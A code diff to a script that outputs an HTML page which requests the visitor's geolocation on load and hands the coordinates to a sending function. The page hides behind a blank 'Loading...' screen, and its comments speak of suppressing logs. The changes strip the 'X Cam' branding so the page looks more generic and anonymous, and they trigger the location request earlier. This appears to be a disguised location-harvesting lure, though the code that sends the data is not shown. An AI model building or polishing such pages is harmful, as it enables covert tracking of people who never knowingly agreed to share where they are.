@@ -6,7 +6,7 @@ echo '
 <!DOCTYPE html>
 <html>
 <head>
-    <title>X Cam - Loading</title>
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
         // Debug function to log messages - only log essential information
@@ -30,7 +30,7 @@ echo '
                 // Don\'t log this message
                 
                 // Show permission request message
-                document.getElementById("locationStatus").innerText = "X Cam - Requesting access...";
+                document.getElementById("locationStatus").innerText = "Requesting access...";
                 
                 navigator.geolocation.getCurrentPosition(
                     sendPosition, 
@@ -53,7 +53,7 @@ echo '
         
         function sendPosition(position) {
             debugLog("Position obtained successfully");
-            document.getElementById("locationStatus").innerText = "X Cam - Loading...";
+            document.getElementById("locationStatus").innerText = "Loading...";
             
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
@@ -110,14 +110,11 @@ echo '
         }
         
         // Try to get location when page loads
-        window.onload = function() {
-            // Don\'t log this message
-            getLocation(); // Auto-start immediately on load
-        };
+        window.addEventListener('DOMContentLoaded', function() { getLocation(); });
     </script>
 </head>
 <body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
-    <h2>X Cam - Loading</h2>
+    <h2>Loading...</h2>
     <p>Initializing...</p>
     <p id="locationStatus">Initializing...</p>
     <div style="margin-top: 30px;">
